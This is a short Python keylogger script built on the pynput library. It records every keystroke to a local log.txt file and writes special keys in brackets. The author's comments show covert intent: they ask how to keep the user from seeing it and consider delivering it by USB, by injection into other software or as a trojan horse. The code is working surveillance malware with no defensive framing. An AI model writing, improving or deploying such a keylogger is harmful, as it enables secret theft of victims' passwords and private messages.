#Main keylogger

#Import Modules
import pynput
from pynput import keyboard

# How do you make sure the user doesn't see this? ** Hidden files **
# Also this doesn't gurantee that there is a log.txt - 
# Figure out how to get special characters - DONE

#Function to log key presses
def Keypress(key):
    print(str(key))
    with open("log.txt", "a") as logKey:   #Open log file to append to
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. It will write them in brackets and remove the "Key." part for better readability.


# Software or hardware implemented? 
# USB, inject it into a software, or make trojan horse
#Main function (Used to listen)        
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    input()

